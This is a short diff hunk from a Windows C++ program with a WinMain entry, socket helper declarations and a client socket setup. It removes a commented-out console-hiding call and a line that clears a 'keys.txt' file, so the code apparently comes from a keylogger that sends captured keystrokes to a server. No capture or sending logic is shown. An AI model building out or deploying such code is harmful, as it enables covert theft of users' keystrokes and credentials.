@@ -17,8 +17,6 @@ void sendMsg(SOCKET client_socket, const char *msg);
 void closeSocket(SOCKET client_socket);
 
 int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
-    //ShowWindow(GetConsoleWindow(), SW_HIDE);
-    ofstream keys("keys.txt", ios::trunc); // clear the keys.txt file everytime this code is run
     
     SOCKET client_socket;
     struct sockaddr_in serv_addr;
